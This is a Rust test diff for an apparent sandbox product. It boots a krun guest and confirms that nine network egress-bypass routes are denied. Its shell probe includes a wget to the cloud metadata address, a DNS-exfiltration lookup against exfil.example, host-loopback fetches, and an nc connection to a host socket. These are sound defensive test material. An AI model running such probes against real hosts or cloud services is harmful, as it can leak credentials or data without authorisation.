@@ -457,3 +457,137 @@ fn run_with_timeout(program: &str, args: &[&str]) {
         .stderr(Stdio::null())
         .status();
 }
+
+/// Every known egress-bypass vector, each of which must resolve to `denied`.
+const BYPASS_VECTORS: &[&str] = &[
+    "direct_tcp_public",
+    "metadata_ip",
+    "dns_exfil",
+    "loopback_tsi",
+    "link_local",
+    "ipv6_loopback",
+    "ipv4_mapped_private",
+    "raw_icmp",
+    "af_unix_host",
+];
+
+/// KME5 bypass-hardening runtime proof. From inside the krun guest's
+/// deny-by-default network namespace, every known egress-bypass vector must be
+/// DENIED — direct TCP/UDP to a public IP, DNS-exfil (high-entropy oversized
+/// label), the cloud metadata IP, loopback/link-local incl. TSI `127.0.0.1`,
+/// IPv6 + IPv4-mapped private, raw/ICMP/AF_PACKET, and AF_UNIX to a host path.
+///
+/// The probe deliberately unsets its injected `HTTP_PROXY` env first, so each
+/// denial below is the netns route/caps/mount seam refusing direct egress, not
+/// the PEP refusing a proxied request. (The PEP-mediated allow/deny parity is
+/// covered by `krun_and_container_pep_enforce_identical_allow_deny`, which also
+/// pins the two-tenant `cross_tenant_reach=denied` case.)
+///
+/// Gated behind `#[ignore]` + `/dev/kvm` like the other krun runtime proofs; it
+/// boots a real libkrun guest as root once execute mode runs on KVM hardware.
+#[test]
+#[ignore = "requires a Linux root host with /dev/kvm plus the full krun OCI runtime stack; the runtime deny proof is gated behind the KME4 execute fail-close lift"]
+fn krun_execute_mode_denies_all_known_bypass_vectors() {
+    if !egress_proof_preconditions_met() {
+        return;
+    }
+
+    // Host loopback sentinel: if the guest's TSI 127.0.0.1 / ::1 ever leaked to
+    // the host loopback it would fetch this body. Containment means it cannot.
+    let loopback_sentinel = TestHttpServer::start("host-loopback-sentinel");
+    let sentinel_port = loopback_sentinel.addr.port();
+
+    let (temp_dir, workdir) = test_workdir("krun-bypass-vectors");
+    let backend = KrunSandboxBackend::new(egress_backend_config(&workdir, 15600));
+    let tenant_id = TenantId::new("krun-bypass-tenant").expect("tenant id should parse");
+    let image = env::var("NIMBUS_KRUN_EGRESS_IMAGE")
+        .unwrap_or_else(|_| "docker://busybox:latest".to_owned());
+    let public_ip =
+        env::var("NIMBUS_KRUN_EGRESS_PUBLIC_IP").unwrap_or_else(|_| "1.1.1.1".to_owned());
+    let public_dns =
+        env::var("NIMBUS_KRUN_EGRESS_PUBLIC_DNS").unwrap_or_else(|_| "8.8.8.8".to_owned());
+
+    let spec = SandboxSpec::new(
+        tenant_id.clone(),
+        SandboxOwnerSpec::standalone_named("krun-bypass-vectors"),
+        SandboxBackendKind::Krun,
+        SandboxRootSpec::oci_image_reference(image),
+        SandboxProcessSpec::new(Vec::<String>::new())
+            .with_entrypoint(["/bin/sh", "-c"])
+            .with_command([bypass_vectors_probe_command(
+                &public_ip,
+                &public_dns,
+                sentinel_port,
+            )]),
+    )
+    .with_mount(SandboxMountSpec::tenant_volume(
+        RESULT_VOLUME,
+        "/nimbus-egress",
+    ));
+
+    let handle = block_on(backend.start(spec))
+        .expect("krun guest should start once execute mode is enabled (KME4)");
+    let _teardown = ForceTeardownGuard::new(
+        backend.clone(),
+        handle.id.clone(),
+        sandbox_netns_path(&workdir, &tenant_id, &handle.id),
+    );
+
+    let result_path = tenant_volume_path(&workdir, &tenant_id, RESULT_VOLUME).join("result");
+    let result = wait_for_result(
+        &result_path,
+        Duration::from_secs(30),
+        "krun bypass-vectors proof result",
+    );
+
+    for vector in BYPASS_VECTORS {
+        assert_result_line(&result, &format!("{vector}=denied"));
+    }
+
+    drop(temp_dir);
+}
+
+fn bypass_vectors_probe_command(public_ip: &str, public_dns: &str, sentinel_port: u16) -> String {
+    // A high-entropy DNS label (60 octets, within the 63-octet label limit) that
+    // stands in for a DNS-tunnel exfil payload.
+    let exfil_label = "d0eadbeefc0ffeebadc0de0123456789abcdef0123456789abcdef0123ab";
+    format!(
+        r#"TMP=/nimbus-egress/result.tmp
+: > "$TMP"
+# Drop the injected proxy env: every probe below tests DIRECT egress, so each
+# denial is the netns route/caps/mount seam, not the PEP refusing a proxied call.
+unset HTTP_PROXY http_proxy HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy
+
+# 1. Direct TCP to a public IP (proxy bypassed): no default route => denied.
+if wget -T 4 -q -O /tmp/pub "http://{public_ip}/"; then echo direct_tcp_public=allowed >> "$TMP"; else echo direct_tcp_public=denied >> "$TMP"; fi
+
+# 2. Cloud metadata service IP (link-local, no route) => denied.
+if wget -T 4 -q -O /tmp/meta "http://169.254.169.254/latest/meta-data/"; then echo metadata_ip=allowed >> "$TMP"; else echo metadata_ip=denied >> "$TMP"; fi
+
+# 3. DNS-exfil: a high-entropy label to a public resolver has no route => denied.
+if nslookup "{exfil_label}.exfil.example" {public_dns} >/dev/null 2>&1; then echo dns_exfil=allowed >> "$TMP"; else echo dns_exfil=denied >> "$TMP"; fi
+
+# 4. Loopback (TSI 127.0.0.1) must be the guest's OWN loopback, never the host's.
+if wget -T 4 -q -O /tmp/lo "http://127.0.0.1:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/lo; then echo loopback_tsi=allowed >> "$TMP"; else echo loopback_tsi=denied >> "$TMP"; fi
+
+# 5. Non-metadata link-local address: no route => denied.
+if wget -T 4 -q -O /tmp/ll "http://169.254.0.1/"; then echo link_local=allowed >> "$TMP"; else echo link_local=denied >> "$TMP"; fi
+
+# 6. IPv6 loopback to the host sentinel (IPv6 disabled on the bridge) => denied.
+if wget -T 4 -q -O /tmp/v6 "http://[::1]:{sentinel_port}/" && grep -q host-loopback-sentinel /tmp/v6; then echo ipv6_loopback=allowed >> "$TMP"; else echo ipv6_loopback=denied >> "$TMP"; fi
+
+# 7. IPv4-mapped private address: no route => denied.
+if wget -T 4 -q -O /tmp/v4m "http://[::ffff:10.0.0.1]/"; then echo ipv4_mapped_private=allowed >> "$TMP"; else echo ipv4_mapped_private=denied >> "$TMP"; fi
+
+# 8. Raw/ICMP/AF_PACKET: CAP_NET_RAW is absent so a raw socket EPERMs (and there
+#    is no route anyway) => denied.
+if ping -c 1 -W 4 {public_ip} >/dev/null 2>&1; then echo raw_icmp=allowed >> "$TMP"; else echo raw_icmp=denied >> "$TMP"; fi
+
+# 9. AF_UNIX to a host socket path: no host socket is mounted into the guest, so
+#    the path is absent and a connect can never reach the host => denied.
+if [ -S /run/nimbus/host.sock ] && nc -U /run/nimbus/host.sock </dev/null >/dev/null 2>&1; then echo af_unix_host=allowed >> "$TMP"; else echo af_unix_host=denied >> "$TMP"; fi
+
+mv "$TMP" {RESULT_PATH_IN_GUEST}
+sleep 30"#
+    )
+}
